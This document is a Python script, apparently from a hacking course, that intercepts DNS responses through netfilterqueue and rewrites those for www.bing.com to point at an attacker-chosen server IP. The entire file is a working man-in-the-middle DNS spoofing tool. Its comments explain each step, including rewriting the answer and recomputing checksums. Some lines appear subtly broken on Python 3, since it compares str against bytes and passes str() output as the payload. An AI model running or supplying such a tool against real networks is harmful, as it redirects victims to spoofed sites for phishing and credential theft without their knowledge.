#! /usr/bin/python3

#NetfilterQueue provides access to packets matched by an iptables rule in Linux. 
#Packets so matched can be accepted, dropped, altered, or given a mark.
import netfilterqueue
#scapy lets us probe, scan or attack networks.
import scapy.all as scapy
#argparse allow us input arguments
import argparse

#A function that creates arguments, can be use by the user to input an IP range
def get_argument():
    #We create an object of argparse
    parser = argparse.ArgumentParser()
    #We store the values local web server we want to passs instead of the of the DNS request
    parser.add_argument("-s", "--server", dest= "server", help= "The IP of your local host or web server")
    #We capture the arguments
    args = parser.parse_args()
    #We make sure the arguments are not empthy
    if not args.server:
        #code to handle the error
        raise argparse.ArgumentTypeError("[-] Please introduce the IP of the web server you want to spoof")
    else:
        #If everything is correct we return the arguments
        return args

#Function that process every packet that pass through the machine
def process_packet(packet):
    #converting packets in scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    #check if the packet has a layer that contain DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        #Sotored the website domain
        qname = scapy_packet[scapy.DNSQR].qname
        #cheack if the website we are going to spoof is in the qname
        if "www.bing.com" in qname:
            #print information that we are spoffing
            print("[+] Spoofing target...")
            #create an answer to the target. rrname store the website nam and the rdata the ip of our spoof website
            answer = scapy.DNSRR(rrname= qname, rdata= get_argument().server)
            #change the packet that will be send to the one that we modified
            scapy_packet[scapy.DNS].an = answer
            #change the answer count to 1
            scapy_packet[scapy.DNS].ancount = 1
            #delete possible packet in the IP layer that could corrupt our answer in the IP layer
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            #delete possible packet in the IP layer that could corrupt our answer in the UDP layer
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            #change the packet to the scapy packet
            packet.set_payload(str(scapy_packet))

    #send the packet to the target
    packet.accept()

#instance of the netfileterqueue to make every packet wait and amount of time 
queue = netfilterqueue.NetfilterQueue()
#bing the iptables of the linux device
queue.bind(0, process_packet)
#run the queue
queue.run()